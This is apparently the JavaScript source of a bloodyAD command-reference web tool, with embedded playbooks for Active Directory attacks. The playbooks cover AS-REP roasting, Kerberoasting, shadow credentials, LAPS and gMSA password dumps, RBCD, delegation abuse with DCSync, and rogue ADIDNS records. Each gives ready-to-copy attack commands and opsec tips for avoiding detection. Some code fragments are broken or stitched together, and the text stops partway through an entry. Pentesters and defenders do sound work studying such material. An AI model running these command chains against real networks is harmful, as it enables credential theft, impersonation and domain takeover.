// INITIALIZATION

document.addEventListener('DOMContentLoaded', () => {
    renderNavigation();
    showAllCommands();
    document.getElementById('total-cmds').textContent = commands.length;
    document.getElementById('showing-cmds').textContent = commands.length;
    const atkBadge=document.getElementById('atk-badge');if(atkBadge)atkBadge.textContent=attacks.length;
    const enumBadge=document.getElementById('enum-badge');if(enumBadge)enumBadge.textContent=enumItems.length;
    let _bloodyTimer;
    const _bloodyEl = document.getElementById('search');
    _bloodyEl.addEventListener('input', () => { clearTimeout(_bloodyTimer); _bloodyTimer = setTimeout(filterCommands, 120); });
    _bloodyEl.addEventListener('keydown', e => { if (e.key === 'Escape') { _bloodyEl.value = ''; filterCommands(); } });
    document.addEventListener('keydown', e => {
        if (e.key === '/' && document.activeElement !== _bloodyEl && !e.ctrlKey && !e.altKey && !e.metaKey) {
            e.preventDefault(); _bloodyEl.focus(); _bloodyEl.select();
        }
    });
    document.querySelectorAll('.gen-group input').forEach(input => { input.addEventListener('change', refreshAll); });
    // Set sidebar offset to match actual header height
    const hh=document.querySelector('.header').offsetHeight;
    const sidebar=document.getElementById('sidebar');
    sidebar.style.top=hh+'px';
    sidebar.style.height='calc(100vh - '+hh+'px)';
});

// ============================================
// NAVIGATION — all categories open by default
// ============================================
function renderNavigation(){
    const nav=document.getElementById('nav-container');
    let html='';
    Object.keys(categories).forEach(cat=>{
        const catData=categories[cat];
        const catCmds=commands.filter(c=>c.cat===cat);
        const subs=[...new Set(catCmds.map(c=>c.sub))];
        // ✅ FIX: add "open" class so all panes start expanded
        html+=`<div class="nav-cat open" id="nav-${cat.replace(/\s/g,'')}">
<div class="nav-cat-header" onclick="toggleNavCat('${cat.replace(/\s/g,'')}')">
<div style="display:flex;align-items:center"><span class="icon ${catData.color}">${catData.icon}</span><span>${cat}</span></div>
<div style="display:flex;align-items:center;gap:8px"><span class="count">${catCmds.length}</span><span class="arrow">▼</span></div>
</div>
<div class="nav-cat-items">
<div class="nav-item" onclick="showCategory('${cat}')"><span>📋 All ${cat}</span><span class="cnt">${catCmds.length}</span></div>
${subs.map(sub=>{const subCnt=catCmds.filter(c=>c.sub===sub).length;return `<div class="nav-item" onclick="showSubCategory('${cat}','${sub}')"><span>${sub}</span><span class="cnt">${subCnt}</span></div>`}).join('')}
</div></div>`;
    });
    nav.innerHTML=html;
}

function toggleNavCat(catId){document.getElementById('nav-'+catId).classList.toggle('open')}

function showAllCommands(){
    currentCategory=null;currentSub=null;updateNavActive();
    const content=document.getElementById('content');
    let html=`<div class="section-header"><h2>🎯 All bloodyAD Commands</h2><p>Complete bloodyAD command reference · ${commands.length} commands · <strong style="color:var(--orange)">All global flags (--host, -d, -u, -p) must come BEFORE the subcommand</strong></p></div>
<div class="guide-box"><h4>💡 Quick Start</h4><p>Fill in the global inputs at the top. Click <strong>Apply All</strong> to substitute values. Click any command to expand and copy.</p><div class="tip">💡 Correct order: <code>bloodyAD --host IP -d DOMAIN -u USER -p PASS add dcsync TRUSTEE</code></div></div>`;
    Object.keys(categories).forEach(cat=>{
        const catCmds=commands.filter(c=>c.cat===cat);
        if(catCmds.length===0)return;
        html+=renderCategorySection(cat,catCmds,false); // false = start expanded
    });
    content.innerHTML=html;
    updateShowingCount();
}

function showCategory(cat){
    currentCategory=cat;currentSub=null;updateNavActive();
    const catData=categories[cat];
    const catCmds=commands.filter(c=>c.cat===cat);
    const content=document.getElementById('content');
    let html=`<div class="section-header"><h2>${catData.icon} ${cat} <span class="proto-badge" style="background:var(--purple)">${catCmds.length} Commands</span></h2><p>${catData.guide.desc}</p></div>
<div class="guide-box"><h4>📖 ${catData.guide.title}</h4><p>${catData.guide.desc}</p>${catData.guide.tips?`<ul>${catData.guide.tips.map(t=>`<li>${t}</li>`).join('')}</ul>`:''}${catData.guide.warn?`<div class="warn">⚠️ ${catData.guide.warn}</div>`:''}</div>`;
    const subs=[...new Set(catCmds.map(c=>c.sub))];
    subs.forEach(sub=>{
        const subCmds=catCmds.filter(c=>c.sub===sub);
        html+=`<div style="margin-bottom:8px;padding:6px 10px;background:var(--bg3);border-radius:4px;font-size:11px;font-weight:600;color:var(--text2)">${sub} (${subCmds.length})</div>${subCmds.map(c=>renderCommandCard(c)).join('')}`;
    });
    content.innerHTML=html;
    updateShowingCount(catCmds.length);
}

function showSubCategory(cat,sub){
    currentCategory=cat;currentSub=sub;updateNavActive();
    const catData=categories[cat];
    const subCmds=commands.filter(c=>c.cat===cat&&c.sub===sub);
    const content=document.getElementById('content');
    let html=`<div class="section-header"><h2>${catData.icon} ${cat} → ${sub} <span class="proto-badge" style="background:var(--cyan)">${subCmds.length} Commands</span></h2><p>${catData.guide.desc}</p></div>${subCmds.map(c=>renderCommandCard(c)).join('')}`;
    content.innerHTML=html;
    updateShowingCount(subCmds.length);
}

<span class="category-arrow">▼</span>
</div>
<div class="category-content">${catCmds.map(c=>renderCommandCard(c)).join('')}</div>

function toggleCategory(catId){document.getElementById('cat-'+catId).classList.toggle('collapsed')}

    const isExpanded=expandedCards.has(c.id);
    return `<div class="cmd-card ${isExpanded?'expanded':''}" id="cmd-${c.id}">

function toggleCmd(id){
    if(expandedCards.has(id)){expandedCards.delete(id)}else{expandedCards.add(id)}
    document.getElementById('cmd-'+id).classList.toggle('expanded');
}

function processCommand(cmd){
    let result=escapeHtml(cmd);
    Object.keys(globalVars).forEach(ph=>{
        const val=getGlobalValue(ph);
        const escapedPh=ph.replace(/[<>]/g,m=>m==='<'?'&lt;':'&gt;');
        const regex=new RegExp(escapedPh,'g');
        if(val){result=result.replace(regex,`<span class="filled">${escapeHtml(val)}</span>`)}
        else{result=result.replace(regex,`<span class="ph">${escapedPh}</span>`)}
    });
    result=result.replace(/&lt;([A-Z0-9_]+)&gt;/g,'<span class="ph">&lt;$1&gt;</span>');
    return result;
}

function getRawCommand(cmd){
    let result=cmd;
    Object.keys(globalVars).forEach(ph=>{
        const val=getGlobalValue(ph);
        if(val){result=result.replace(new RegExp(ph.replace(/[<>]/g,'\\$&'),'g'),val)}
    });
    return result;
}

function getGlobalValue(ph){
    const inputId=globalVars[ph];
    if(inputId){const el=document.getElementById(inputId);return el?el.value:''}
    return '';
}

function escapeHtml(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}

let _bloodySearchTerms = [];
function hlBloody(text) {
    if (!text) return '';
    if (!_bloodySearchTerms.length) return escapeHtml(text);
    let h = escapeHtml(text);
    _bloodySearchTerms.forEach(t => { h = h.replace(new RegExp('(' + t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'), '<mark>$1</mark>'); });
    return h;
}

function refreshAll(){
    commands.forEach(c=>{const codeEl=document.getElementById('cmd-code-'+c.id);if(codeEl){codeEl.innerHTML=processCommand(c.cmd)}});
    if(typeof refreshAttackEnumCmds==='function') refreshAttackEnumCmds();
    // Refresh Attack Matrix command blocks
    document.querySelectorAll('[id^="mxcode-"]').forEach(el=>{
      const raw=el.dataset&&el.dataset.mxraw;
      if(raw&&typeof mxProcessCmd==='function')el.innerHTML=mxProcessCmd(raw);
    });
    showToast('Commands updated!');
}

function clearGlobals(){
    Object.values(globalVars).forEach(id=>{const el=document.getElementById(id);if(el)el.value=''});
    refreshAll();
    showToast('Cleared all values');
}

function filterCommands(){
    const query=document.getElementById('search').value.toLowerCase().trim();
    if(!query){_bloodySearchTerms=[];showAllCommands();return}
    const terms=query.split(/\s+/).filter(t=>t);
    _bloodySearchTerms=terms;
    const filtered=commands.filter(c=>{
        const text=[c.n,c.purp,c.cmd,c.cat,c.sub,c.tips||''].join(' ').toLowerCase();
        return terms.every(t=>text.includes(t));
    });
    const content=document.getElementById('content');
    if(filtered.length===0){
        content.innerHTML=`<div class="empty"><div class="icon">🔍</div><h3>No commands found</h3><p>Try different search terms</p></div>`;
        updateShowingCount(0);return;
    }
    let html=`<div class="section-header"><h2>🔍 Search Results</h2><p>Found ${filtered.length} commands matching "<strong>${query}</strong>"</p></div>${filtered.map(c=>renderCommandCard(c)).join('')}`;
    content.innerHTML=html;
    updateShowingCount(filtered.length);
}

function updateNavActive(){document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active'))}
function updateShowingCount(count){document.getElementById('showing-cmds').textContent=count!==undefined?count:commands.length}

function copyCmd(id,event){
    event.stopPropagation();
    const cmd=commands.find(c=>c.id===id);
    if(!cmd)return;
    const rawCmd=getRawCommand(cmd.cmd);
    navigator.clipboard.writeText(rawCmd).then(()=>{
        const btn=event.target;
        btn.classList.add('copied');btn.textContent='✓ Copied!';
        showToast('Command copied!');
        setTimeout(()=>{btn.classList.remove('copied');btn.textContent='Copy'},2000);
    }).catch(()=>{
        const ta=document.createElement('textarea');
        ta.value=rawCmd;ta.style.position='fixed';ta.style.left='-9999px';
        document.body.appendChild(ta);ta.select();
        try{document.execCommand('copy');showToast('Command copied!')}catch(e){showToast('Copy failed')}
        document.body.removeChild(ta);
    });
}

{id:'asrep',cat:'cred',icon:'🎟️',name:'AS-REP Roasting Setup',impact:'medium',noise:'low',
 prereq:'Write access to target\'s userAccountControl attribute (GenericAll, WriteProperty on Account-Restrictions)',
 desc:'<strong>What:</strong> Set the DONT_REQ_PREAUTH flag on a user account. Kerberos will then respond to AS-REQ requests for that user WITHOUT requiring pre-authentication — meaning an unauthenticated attacker can request an AS-REP and crack the user\'s password offline.<br><br><strong>Why it works:</strong> Without pre-auth, the KDC sends a TGT encrypted with the user\'s key. The AS-REP encrypted blob can be cracked offline with hashcat/john.',
 steps:[
  {n:1,t:'Check existing AS-REP roastable accounts',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\' --attr sAMAccountName',note:'Lists accounts with DONT_REQ_PREAUTH set. Exploit those first before modifying anything.'},
  {n:2,t:'Set DONT_REQ_PREAUTH on target user',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add uac <TARGET> -f DONT_REQ_PREAUTH',note:'<TARGET> = victim user sAMAccountName. This disables Kerberos pre-authentication for that account.'},
  {n:3,t:'Get AS-REP hash (from attacker machine, no creds needed)',cmd:'GetNPUsers.py <DOMAIN>/<TARGET> -no-pass -dc-ip <HOST>',note:'Run from attacker machine. No credentials needed if DONT_REQ_PREAUTH is set. Output is in $krb5asrep$23$... format.'},
  {n:4,t:'Crack the AS-REP hash offline',cmd:'hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force',note:'Mode 18200 for AS-REP. If rockyou doesn\'t work, try rule-based: --rules /usr/share/hashcat/rules/best64.rule'},
  {n:5,t:'🧹 CLEANUP: Remove DONT_REQ_PREAUTH flag',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove uac <TARGET> -f DONT_REQ_PREAUTH',note:'Restore the original UAC flags. Verify with: get object <TARGET> --attr userAccountControl',cleanup:true}
 ],
 opsec:['Modifying UAC generates Event ID 4738 ("A user account was changed")','Get the hash IMMEDIATELY after setting the flag, then restore — minimize exposure window','The AS-REP request itself is low noise (4768 with no pre-auth)']},

{id:'kerberoast',cat:'cred',icon:'🍺',name:'Kerberoasting Setup (Add SPN)',impact:'medium',noise:'low',
 prereq:'Write access to servicePrincipalName attribute on target user (GenericAll, or WRITE_PROP on Public-Information)',
 desc:'<strong>What:</strong> Add a fake SPN (Service Principal Name) to a target user account. The KDC will then issue Service Tickets encrypted with that user\'s NTLM hash, which can be cracked offline.<br><br><strong>Why it works:</strong> Kerberos ST (TGS) tickets are encrypted with the service account\'s hash. Any authenticated domain user can request a TGS for any SPN — the resulting ticket is crackable.',
 steps:[
  {n:1,t:'Check existing Kerberoastable accounts',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(&(samAccountType=805306368)(servicePrincipalName=*))\' --attr sAMAccountName,servicePrincipalName',note:'Lists all users with SPNs already set. Roast those first before modifying anything new.'},
  {n:2,t:'Add a fake SPN to a high-value user account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object <TARGET> servicePrincipalName -v \'HTTP/fakesvc.<DOMAIN>\'',note:'<TARGET> = sAMAccountName of victim user (e.g. john.admin). set object writes the SPN attribute directly. Verify after: get object <TARGET> --attr servicePrincipalName. Format: ServiceClass/HostName or ServiceClass/HostName:Porter, e.g. CN=john.admin,CN=Users,DC=domain,DC=com. The SPN string format: ServiceClass/HostName[:Port]'},
  {n:3,t:'Request TGS for the fake SPN',cmd:'GetUserSPNs.py \'<DOMAIN>/<USER>:<PASS>\' -dc-ip <HOST> -request',note:'Outputs $krb5tgs$23$... hashes for each Kerberoastable account. Hash includes the account\'s NT hash.'},
  {n:4,t:'Crack the TGS hash offline',cmd:'hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt --force',note:'Mode 13100 for TGS-REP (RC4). Mode 19600 for AES128, 19700 for AES256. RC4 cracks faster.'},
  {n:5,t:'🧹 CLEANUP: Remove the fake SPN',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object <TARGET> servicePrincipalName',note:'Omitting -v deletes the attribute entirely. Verify removal: get object <TARGET> --attr servicePrincipalNamet <TARGET> --attr servicePrincipalName',cleanup:true}
 ],
 opsec:['Adding an SPN generates Event ID 4738','TGS requests generate Event ID 4769 — high volume is suspicious','Request the ticket and remove the SPN quickly to minimize detection window']},

{id:'shadowcred',cat:'cred',icon:'🌑',name:'Shadow Credentials (msDS-KeyCredentialLink)',impact:'critical',noise:'medium',
 prereq:'Write access to msDS-KeyCredentialLink attribute on target (GenericAll, GenericWrite, or WriteProperty on Private-Information)',
 desc:'<strong>What:</strong> Add a Key Credential entry to a target object\'s msDS-KeyCredentialLink attribute. This creates a PKINIT backdoor — you can authenticate as the target using the generated certificate WITHOUT knowing their password, and retrieve their NT hash.<br><br><strong>Why it works:</strong> Windows Hello for Business and PKINIT use msDS-KeyCredentialLink for certificate-based auth. You forge a credential entry for your own certificate, then authenticate as the victim to get a TGT and extract the NT hash.',
 steps:[
  {n:1,t:'Verify DC supports shadow credentials (Win Server 2016+)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'\' --attr domainControllerFunctionality',note:'Must return 7 (DS_BEHAVIOR_WIN2016) or higher. If below 7, shadow credentials are not supported.'},
  {n:2,t:'Add shadow credential to target',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add shadowCredentials <TARGET> --path /tmp/<TARGET>_shadow',note:'Generates a certificate keypair, adds the public key to target\'s msDS-KeyCredentialLink. Saves a .pfx or ccache to --path. If PKINIT succeeds, you get a ccache TGT directly.'},
  {n:3,t:'If PKINIT succeeded: use the ccache',cmd:'export KRB5CCNAME=/tmp/<TARGET>_shadow.ccache && klist',note:'The ccache contains a TGT for the victim. Use it directly with -k flag on any Kerberos-aware tool.'},
  {n:4,t:'If PKINIT succeeded: extract NT hash via U2U',cmd:'gettgtpkinit.py -cert-pfx /tmp/<TARGET>_shadow.pfx <DOMAIN>/<TARGET> /tmp/tgt.ccache && getnthash.py -key <SESSION_KEY> <DOMAIN>/<TARGET>',note:'Alternative if bloodyAD didn\'t auto-extract. gettgtpkinit.py from PKINITtools. Extract the NT hash for pass-the-hash.'},
  {n:5,t:'Use NT hash for Pass-the-Hash',cmd:'evil-winrm -i <HOST> -u <TARGET> -H <NTHASH>',note:'No password needed — authenticate directly with the NT hash.'},
  {n:6,t:'🧹 CLEANUP: Remove shadow credential',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove shadowCredentials <TARGET>',note:'Omit --key to remove ALL shadow credentials. Use --key <RSA_KEY> to remove specific entry only.',cleanup:true}
 ],
 opsec:['msDS-KeyCredentialLink write generates Event ID 4662 + 5136','PKINIT auth generates different events than normal password auth — detectable','More stealthy than password resets — victim can still log in normally']},

{id:'laps',cat:'cred',icon:'🔐',name:'LAPS Password Dump',impact:'high',noise:'low',
 prereq:'Read access to ms-Mcs-AdmPwd attribute (or ms-LAPS-Password for new LAPS) on target computer object',
 desc:'<strong>What:</strong> Read the LAPS-managed local Administrator password stored in AD on the computer object. LAPS (Local Administrator Password Solution) stores a unique, rotating local admin password per machine in a confidential AD attribute.<br><br><strong>Why it works:</strong> LAPS stores plaintext (or encrypted, for new LAPS) passwords in ms-Mcs-AdmPwd. Only specific accounts/groups should have read access, but misconfigurations are common.',
 steps:[
  {n:1,t:'Find computers with LAPS enabled',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(ms-Mcs-AdmPwdExpirationTime=*)\' --attr name,ms-Mcs-AdmPwd',note:'Lists all computers with LAPS configured. If ms-Mcs-AdmPwd is empty in output, you don\'t have read rights.'},
  {n:2,t:'Dump ALL LAPS passwords you have access to',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(ms-Mcs-AdmPwdExpirationTime=*)\' --attr name,ms-Mcs-AdmPwd',note:'Returns all LAPS-enabled computers and their passwords (blank if you lack read rights on ms-Mcs-AdmPwd). If a machine shows blank password, you lack access.'},
  {n:3,t:'Get LAPS for a specific computer',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'COMPUTER$\' --attr ms-Mcs-AdmPwd',note:'Replace COMPUTER$ with the target hostname + $, e.g. WEB01$. Returns the current local admin password.'},
  {n:4,t:'Authenticate as local Administrator using LAPS password',cmd:'evil-winrm -i <TARGET_IP> -u Administrator -p \'<LAPS_PASSWORD>\'',note:'LAPS password is for the LOCAL Administrator account on that specific machine — not the domain admin.'},
  {n:5,t:'Dump local SAM/credentials from the machine',cmd:'secretsdump.py \'./Administrator:<LAPS_PASSWORD>\'@<TARGET_IP>',note:'Now that you have local admin, dump credentials. May find reused domain credentials in memory.'}
 ],
 opsec:['Reading ms-Mcs-AdmPwd generates Event ID 4662 on modern DCs with attribute auditing','New LAPS (2023+) uses ms-LAPS-Password (encrypted) instead','Tool nxc can also dump LAPS: nxc ldap <HOST> -u <USER> -p <PASS> -M laps']},

{id:'gmsa',cat:'cred',icon:'🤖',name:'GMSA Password Dump',impact:'high',noise:'low',
 prereq:'Membership in PrincipalsAllowedToRetrieveManagedPassword group for the GMSA, or read access to msDS-ManagedPassword',
 desc:'<strong>What:</strong> Read a Group Managed Service Account\'s (gMSA) password. gMSA passwords are automatically managed by AD, but specific principals can retrieve them via the msDS-ManagedPassword attribute.<br><br><strong>Why it works:</strong> gMSA passwords are stored encrypted in AD and decryptable by authorized principals. The NTLM hash can be derived from the returned blob.',
 steps:[

  {n:3,t:'Dump all GMSA passwords (get search)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(objectClass=msDS-GroupManagedServiceAccount)\' --attr sAMAccountName,msDS-ManagedPassword',note:'Lists all gMSA accounts and their passwords (blank if you lack PrincipalsAllowedToRetrieveManagedPassword rights). Outputs NTLM hash directly.'},
  {n:4,t:'Pass-the-Hash with GMSA NT hash',cmd:'evil-winrm -i <HOST> -u \'gmsaAccount$\' -H <NTHASH>',note:'Use the NT hash with the gMSA account name (including $). gMSAs often have privileged service permissions.'},
  {n:5,t:'Use nxc for GMSA dump alternative',cmd:'nxc ldap <HOST> -u <USER> -p \'<PASS>\' --gmsa',note:'Alternative tool. nxc will retrieve and compute NTLM hashes from gMSA password blobs.'}
 ],

// ── DELEGATION ATTACKS ────────────────────────────────────
{id:'rbcd',cat:'deleg',icon:'🔄',name:'RBCD — Resource-Based Constrained Delegation',impact:'critical',noise:'high',
 prereq:'Write access to target\'s msDS-AllowedToActOnBehalfOfOtherIdentity (GenericAll/GenericWrite on target computer); plus a service account or computer you control',
 desc:'<strong>What:</strong> Configure a target computer to trust your controlled service/computer account for delegation. Then use S4U2Self + S4U2Proxy to impersonate ANY domain user (including DA) on the target — obtaining a Service Ticket for any service on that machine.<br><br><strong>Why it works:</strong> RBCD (RFC 4120 extension) allows resource owners to control which accounts can delegate to them. By writing msDS-AllowedToActOnBehalfOfOtherIdentity on a target DC/server, you can impersonate DA.',
 steps:[
  {n:1,t:'Step 1: Create or identify a controlled computer account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add computer evilcomp \'EvilPass123!\'',note:'You need a service account (any account with an SPN). Adding a computer is easiest if MAQ > 0. Check MAQ: get object \'DC=domain,DC=com\' --attr ms-DS-MachineAccountQuota'},
  {n:2,t:'Get the SID of your controlled computer',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'evilcomp$\' --attr objectSid',note:'Gets the SID of your rogue computer account. You need this SID of your controlled account to write into msDS-AllowedToActOnBehalfOfOtherIdentity.'},
  {n:3,t:'Set RBCD — write your account\'s SID onto target',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add rbcd <TARGET> evilcomp',note:'<TARGET> = target computer sAMAccountName (e.g. DC01 or WEB01). This writes evilcomp\'s SID into TARGET\'s msDS-AllowedToActOnBehalfOfOtherIdentity.'},
  {n:4,t:'Request a Service Ticket impersonating Administrator',cmd:'getST.py \'<DOMAIN>/evilcomp$:EvilPass123!\' -spn \'cifs/<TARGET>.<DOMAIN>\' -impersonate Administrator -dc-ip <HOST>',note:'S4U2Self gets a ticket for Administrator → S4U2Proxy forwards it to cifs/TARGET. Saves a .ccache file.'},
  {n:5,t:'Use the impersonated ticket',cmd:'export KRB5CCNAME=Administrator@cifs_<TARGET>.<DOMAIN>@<DOMAIN>.ccache && secretsdump.py -k -no-pass <DOMAIN>/Administrator@<TARGET>.<DOMAIN>',note:'The ccache contains a TGS for Administrator on TARGET. secretsdump dumps all hashes from the target.'},
  {n:6,t:'🧹 CLEANUP: Remove RBCD',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove rbcd <TARGET> evilcomp',note:'Remove RBCD delegation. Also remove the rogue computer account if you created one.',cleanup:true},
  {n:7,t:'🧹 CLEANUP: Remove rogue computer account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove object evilcomp',note:'Delete the evilcomp computer account.',cleanup:true}
 ],
 opsec:['RBCD modification generates Event ID 5136 (attribute change on computer object)','S4U requests generate Event IDs 4769 and 4768 (Kerberos ticket events)','--host must be FQDN for Kerberos (use -i for IP resolution): bloodyAD --host DC01.domain.com -i <DC_IP>']},

{id:'unconstrained',cat:'deleg',icon:'🎪',name:'Unconstrained Delegation Discovery',impact:'high',noise:'low',
 prereq:'Read-only domain user; need a way to coerce authentication (Printer Bug, PetitPotam, etc.)',
 desc:'<strong>What:</strong> Enumerate computers with Unconstrained Delegation enabled. When a user authenticates to such a machine, their TGT is embedded in the service ticket and cached on the machine — allowing anyone who controls that machine to impersonate the victim everywhere.<br><br><strong>Why it works:</strong> TrustedForDelegation flag causes the KDC to include the user\'s TGT in the service ticket. If you control a machine with this flag, and can coerce a DC to authenticate to it (Printer Bug/PetitPotam), you can capture the DC\'s TGT → Golden Ticket potential.',
 steps:[
  {n:1,t:'Enumerate unconstrained delegation computers',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))\' --attr sAMAccountName,dNSHostName',note:'Lists computers with TRUSTED_FOR_DELEGATION, excluding DCs (primaryGroupID=516). DCs always have this — focus on non-DC machines (member servers).'},
  {n:2,t:'If you control the unconstrained machine — coerce DC auth',cmd:'printerbug.py <DOMAIN>/<USER>:<PASS>@<DC_FQDN> <UNCONSTRAINED_MACHINE>',note:'Triggers the DC to authenticate to your controlled machine via the Printer Spooler bug. Requires Spooler service running on DC (check: nxc smb <DC_IP> -u <USER> -p <PASS>)'},
  {n:3,t:'Capture the DC TGT on the unconstrained machine',cmd:'Rubeus.exe monitor /interval:1 /filteruser:DC01$',note:'Run on the unconstrained machine. Captures TGTs as they arrive. DC$ account TGT will appear when auth is coerced.'},
  {n:4,t:'Alternative coercion: PetitPotam (unauthenticated)',cmd:'PetitPotam.py -u \'\' -p \'\' <UNCONSTRAINED_MACHINE> <DC_FQDN>',note:'Works when Spooler is disabled. Uses MS-EFSR (EFS) protocol to coerce DC authentication.'},
  {n:5,t:'Import captured DC TGT and DCSync',cmd:'Rubeus.exe ptt /ticket:<base64_TGT> && mimikatz "lsadump::dcsync /domain:<DOMAIN> /all"',note:'Inject the DC TGT and perform DCSync from the unconstrained machine.'}
 ],
 opsec:['Coercion generates authentication events on the DC — noisy','Rubeus monitor is a process on the target machine — endpoint detection risk']},

{id:'constrained',cat:'deleg',icon:'⛓️',name:'Constrained Delegation Discovery & Abuse',impact:'high',noise:'medium',
 prereq:'Read-only for enumeration; control over the delegating service account for abuse',
 desc:'<strong>What:</strong> Enumerate accounts with Constrained Delegation (msDS-AllowedToDelegateTo). These accounts can impersonate ANY user to specific SPNs. With S4U2Self (if TRUSTED_TO_AUTH_FOR_DELEGATION is set), they can impersonate DA to those services.<br><br><strong>Why it works:</strong> Constrained delegation allows S4U2Proxy — but only to specific services. However, S4U2Self works for ANY user, meaning you can get a forwardable TGS for DA, then forward it to any allowed service.',
 steps:[
  {n:1,t:'Find accounts with constrained delegation',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(msDS-AllowedToDelegateTo=*)\' --attr sAMAccountName,msDS-AllowedToDelegateTo',note:'Lists all accounts with constrained delegation configured. Check what services they can delegate to.'},
  {n:2,t:'Get details on the delegating account',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get object \'svc_account\' --attr msDS-AllowedToDelegateTo,userAccountControl',note:'Check if TRUSTED_TO_AUTH_FOR_DELEGATION is set in UAC (protocol transition — allows any user impersonation).'},
  {n:3,t:'Impersonate Administrator using S4U2Proxy',cmd:'getST.py \'<DOMAIN>/svc_account:<PASS>\' -spn \'cifs/<TARGET_SERVER>\' -impersonate Administrator -dc-ip <HOST>',note:'If the service account has TRUSTED_TO_AUTH_FOR_DELEGATION. This gets a TGS for Administrator on the target service.'},
  {n:4,t:'Use the Service Ticket',cmd:'export KRB5CCNAME=Administrator@cifs_<TARGET_SERVER>@<DOMAIN>.ccache && wmiexec.py -k -no-pass <DOMAIN>/Administrator@<TARGET_SERVER>',note:'The ccache allows authenticating as Administrator to the delegated service.'}
 ],
 opsec:['S4U requests generate Event IDs 4768/4769 with specific transited-services fields — detectable','Focus on constrained delegation to CIFS/HOST/HTTP — highest value targets']},

// ── DNS ATTACKS ──────────────────────────────────────────
{id:'adidns',cat:'dns',icon:'🌐',name:'ADIDNS Spoofing (Rogue DNS Record)',impact:'high',noise:'low',
 prereq:'Any authenticated domain user (by default all users can create DNS records in AD-integrated zones)',
 desc:'<strong>What:</strong> Add a malicious DNS A record to the AD-integrated DNS zone. Other domain machines that query for that hostname will get your attacker IP, allowing NTLM relay, credential capture, or MitM attacks.<br><br><strong>Why it works:</strong> By default, any authenticated domain user can create new DNS records in AD-integrated DNS zones (CreateChild on MicrosoftDNS container). Existing records cannot be overwritten unless you own them.',
 steps:[
  {n:1,t:'Check for wildcard DNS entry (if exists, spoofing won\'t work)',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get dnsDump | grep -A5 \'\\*\'',note:'A wildcard (*) DNS record means all unresolved hostnames go to a specific IP — your rogue record won\'t override it. If no wildcard, proceed.'},
  {n:2,t:'Dump all DNS records to find gaps',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get dnsDump --no-detail',note:'Find hostnames that are NOT already resolved. Choose a target hostname that clients are likely to query.'},
  {n:3,t:'Add a rogue DNS A record pointing to your IP',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add dnsRecord wpad <ATTACKER_IP>',note:'Classic targets: wpad, webproxy, fileserver, sharepoint. Clients querying "wpad" for WPAD proxy auto-discovery will get your IP.'},
  {n:4,t:'Start Responder to capture NTLM hashes',cmd:'responder -I eth0 -dwv',note:'Clients connecting to your IP for WPAD/SMB/HTTP will authenticate, capturing NTLMv2 hashes for cracking.'},
  {n:5,t:'OR: Start ntlmrelayx for relay attacks',cmd:'ntlmrelayx.py -tf targets.txt -smb2support',note:'Relay incoming NTLM auth from clients to targets. If target has SMB signing disabled, you can execute commands.'},
  {n:6,t:'🧹 CLEANUP: Remove rogue DNS record',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove dnsRecord wpad <ATTACKER_IP>',note:'Remove the fake record. If you need to verify it\'s gone: get dnsDump --zone <DOMAIN>',cleanup:true}
 ],
 opsec:['DNS record creation is logged but rarely alerted on','WPAD is a well-known attack vector — modern Windows has mitigation for it (security zones)','Use a hostname that seems legitimate to the environment']},

{id:'wildcard-dns',cat:'dns',icon:'🌀',name:'Wildcard DNS Entry (ADIDNS Wildcard)',impact:'high',noise:'medium',
 prereq:'CreateChild permission on DNS zone container (usually domain users by default)',
 desc:'<strong>What:</strong> Create a wildcard DNS record (*) in the AD-integrated zone that resolves ALL unresolved hostnames to your attacker IP. More powerful than individual records — catches ALL non-existent hostnames automatically.<br><br><strong>Why it works:</strong> Wildcard DNS entries follow RFC 4592. AD-integrated DNS supports them. Any hostname not in the zone resolves to the wildcard IP — perfect for catching LLMNR/NBT-NS queries that have leaked to DNS.',
 steps:[
